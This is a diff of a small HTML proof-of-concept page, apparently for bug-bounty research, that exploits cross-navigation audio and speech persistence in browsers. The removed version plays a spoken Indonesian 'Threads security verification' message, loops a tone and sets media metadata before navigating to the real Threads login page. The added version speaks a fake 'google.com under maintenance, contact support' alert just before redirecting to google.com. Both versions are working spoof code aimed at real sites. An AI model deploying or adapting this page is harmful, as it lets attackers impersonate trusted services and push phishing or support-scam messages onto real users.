@@ -1,22 +1,69 @@
 <!DOCTYPE html>
-<!-- REAL-TARGET SPOOF PoC — cross-navigation resource lifetime (TTS/audio/MediaSession)
-     Arm resource dari origin-mu, lalu navigasi tab ke Threads asli. Bila resource bertahan di
-     halaman Threads (bilah alamat = threads.com asli, "suara"/now-playing = penyerang) = misatribusi.
-     Kelas CVE-2026-7935/8963. Paling kuat di mobile Chrome/Safari. -->
-<html lang="id"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
-<body style="font-family:system-ui;padding:24px">
-  <h3>Threads spoof PoC (cross-nav resource)</h3>
-  <button style="font-size:16px;padding:12px 20px" onclick="go()">Continue to Threads</button>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SpeechSynthesis Redirect PoC (Controlled)</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    text-align: center;
+    padding: 60px;
+  }
+  button {
+    padding: 15px 30px;
+    font-size: 20px;
+    cursor: pointer;
+  }
+  #status {
+    margin-top: 20px;
+    font-size: 18px;
+    color: darkred;
+  }
+</style>
+</head>
+<body>
+
+<h2>CLICK TO GOOGLE</h2>
+<button id="speechBtn">CLICK CALL CENTER GOOGLE</button>
+<div id="status">Status: Waiting...</div>
+
 <script>
-var TARGET = "https://www.threads.com/login";     // <-- target in-scope
-function tone(){var sr=8000,n=sr,b=new Uint8Array(44+n*2),d=new DataView(b.buffer),w=function(o,s){for(var i=0;i<s.length;i++)d.setUint8(o+i,s.charCodeAt(i))};
- w(0,'RIFF');d.setUint32(4,36+n*2,true);w(8,'WAVE');w(12,'fmt ');d.setUint32(16,16,true);d.setUint16(20,1,true);d.setUint16(22,1,true);d.setUint32(24,sr,true);d.setUint32(28,sr*2,true);d.setUint16(32,2,true);d.setUint16(34,16,true);w(36,'data');d.setUint32(40,n*2,true);
- for(var i=0;i<n;i++)d.setInt16(44+i*2,Math.sin(i/14)*900,true);var s='';for(var j=0;j<b.length;j++)s+=String.fromCharCode(b[j]);return 'data:audio/wav;base64,'+btoa(s);}
-function go(){
-  try{ var u=new SpeechSynthesisUtterance("Verifikasi keamanan Threads. Demo suara lintas navigasi. ".repeat(6)); speechSynthesis.speak(u); }catch(e){}
-  try{ var a=new Audio(tone()); a.loop=true; a.play(); }catch(e){}
-  try{ if('mediaSession' in navigator) navigator.mediaSession.metadata=new MediaMetadata({title:"Masuk ke Threads",artist:"Threads Accounts"}); }catch(e){}
-  setTimeout(function(){ location.href=TARGET; }, 1500);   // navigasi tab ini ke Threads asli
-}
+const btn = document.getElementById('speechBtn');
+const status = document.getElementById('status');
+
+btn.addEventListener('click', () => {
+
+  const text = "Attention: google.com is currently under maintenance. Please contact support immediately.";
+
+  if (!('speechSynthesis' in window)) {
+    status.textContent = "SpeechSynthesis not supported.";
+    return;
+  }
+
+  const utter = new SpeechSynthesisUtterance(text);
+  utter.lang = 'en-US';
+
+  const voices = speechSynthesis.getVoices();
+  const enVoice = voices.find(v => v.lang.startsWith('en'));
+  if (enVoice) utter.voice = enVoice;
+
+  status.textContent = "Preparing redirect...";
+
+  // Redirect cepat
+  setTimeout(() => {
+
+    // Trigger speech tepat sebelum navigasi
+    speechSynthesis.speak(utter);
+    console.log("[PoC] Speech triggered");
+
+    // Navigasi langsung setelah speech dipanggil
+    window.location.replace('https://google.com');
+
+  }, 300); // delay kecil (bisa tweak 100–500ms untuk testing)
+
+});
 </script>
-</body></html>
+
+</body>
+</html>
